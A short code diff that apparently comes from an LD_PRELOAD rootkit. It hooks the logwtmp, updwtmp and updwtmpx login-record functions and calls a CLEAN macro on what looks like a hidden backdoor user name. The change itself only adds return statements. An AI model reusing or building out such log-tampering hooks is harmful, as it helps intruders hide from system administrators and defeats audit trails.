@@ -64,6 +64,7 @@ void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host)
     CLEAN(bduname);
     HOOK(o_logwtmp,CLOGWTMP);
     o_logwtmp(ut_line,ut_name,ut_host);
+    return;
 }
 
 void updwtmp(const char *wfile, const struct utmp *ut)
@@ -77,6 +78,7 @@ void updwtmp(const char *wfile, const struct utmp *ut)
 
     HOOK(o_updwtmp,CUPDWTMP);
     o_updwtmp(wfile,ut);
+    return;
 }
 
 void updwtmpx(const char *wfilex, const struct utmpx *utx)
@@ -90,4 +92,5 @@ void updwtmpx(const char *wfilex, const struct utmpx *utx)
 
     HOOK(o_updwtmpx,CUPDWTMPX);
     o_updwtmpx(wfilex,utx);
+    return;
 }
